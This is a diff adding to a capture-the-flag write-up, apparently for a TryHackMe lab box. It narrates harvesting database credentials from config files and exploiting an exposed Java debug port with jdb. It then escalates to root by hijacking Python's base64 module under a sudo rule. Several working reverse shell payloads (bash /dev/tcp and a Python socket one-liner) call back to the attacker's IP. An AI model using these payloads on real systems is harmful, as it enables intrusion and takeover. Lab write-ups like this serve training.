@@ -135,7 +135,7 @@ So i'm guessing we need to inject ourselve before `base64` module
 
 Let's try a reverse shell to get rid of this annoying shell
 ```
-python -c "import os; os.system('bash -i >& /dev/tcp/10.6.32.20/7777 0>&1')"
+python -c "import os; os.system('bash -i >& /dev/tcp/10.6.32.20/5555 0>&1')"
 ```
 
 Hmmm nop..
@@ -181,3 +181,98 @@ In wp-config, maybe we can reach the wordpress admin login ? What would that giv
 ```
 (156,'whl_redirect_admin','404','yes'),
 ```
+
+Fresh session after about a week.
+
+Poking around looking at the files on port `80` I found some credentials in `/var/www/html/limesurvey/application/config/config.php`:
+```
+'connectionString' => 'mysql:host=localhost;port=3306;dbname=limedb;',
+                        'emulatePrepare' => true,
+                        'username' => 'Anny',
+                        'password' => 'P4$W0RD!!#S3CUr3!',
+                        'charset' => 'utf8mb4',
+                        'tablePrefix' => 'lime_',
+```
+
+This give us the answer for the first question :
+```
+Anny:P4$W0RD!!#S3CUr3!
+```
+
+Also found a backdoor directly on the server `http://$IP/shell.php?c=CMD`. Didn't use it to get in tho.
+
+
+Now let's try to find the url for the login page.
+
+Connecting to the db using `mysql -u wordpressuser -p` then `use wordpress;`
+
+We get the path with `select * from wp_options where option_name = "whl_page";`
+```
++-----------+-------------+--------------+----------+
+| option_id | option_name | option_value | autoload |
++-----------+-------------+--------------+----------+
+|       155 | whl_page    | devtools     | yes      |
++-----------+-------------+--------------+----------+
+```
+
+Hmmm.. Let's continue with our escalation of the box.
+
+We see that `veronica` is running `Ghidra`
+```
+veronica  1730  0.0  0.1  12532  2892 ?        S    20:21   0:00 /bin/bash /home/veronica/ghidra_9.0/support/ghidraDebug
+veronica  1739  0.0  0.1  12584  3132 ?        S    20:21   0:00 /bin/bash /home/veronica/ghidra_9.0/support/launch.sh debug Ghidra   ghidra.GhidraRun
+```
+
+Found this exploit `https://web.archive.org/web/20190306002449/https://static.hacker.house/releasez/expl0itz/jdwp-exploit.txt`
+
+
+Seems like we can't execute a reverse shell from there. Something to do with how java handle quote & stuff. We first write our revshell to a bash script :
+```bash
+#!/bin/bash
+bash -i >& /dev/tcp/10.6.32.20/6666 0>&1
+```
+
+Then
+```
+jdb -attach 127.0.0.1:18001
+trace go methods
+untrace
+stop in org.apache.logging.log4j.core.util.WatchManager$FileMonitor.access$300
+WAIT FOR BREAKPOINT...
+print new java.lang.Runtime().exec("/dev/shm/revshell.sh")
+```
+
+And we get a revshell to `veronica`
+
+We find `user.txt`
+```
+THM{EB0C770CCEE1FD73204F954493B1B6C5E7155B177812AAB47EFB67D34B37EBD3}
+```
+
+In the home, there is that suspicious `base.py` file that ask to be injected.
+In `/etc/crontab` we have:
+```
+*  *    * * *   root    cd /root/Lucrecia && bash lucre.sh
+```
+
+Maybe the `lucre.sh` script call python and we can inject ourselves in there ?
+
+Oh wellll, way easier than that. The output of `sudo -l` :
+```
+ (root : root) NOPASSWD: /usr/bin/python3.5 /home/veronica/base.py
+```
+
+Let's just inject ourself another revshell in base.py and we are good to go !
+
+To do so, we simply create a `base64` folder in `/home/veronica` and create a `__init__.py` file with the following content :
+```py
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.32.20",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
+```
+
+We then get a root shell and retrieve the flag :
+
+Root.txt :
+```
+THM{02EAD328400C51E9AEA6A5DB8DE8DD499E10E975741B959F09BFCF077E11A1D9}
+```
+
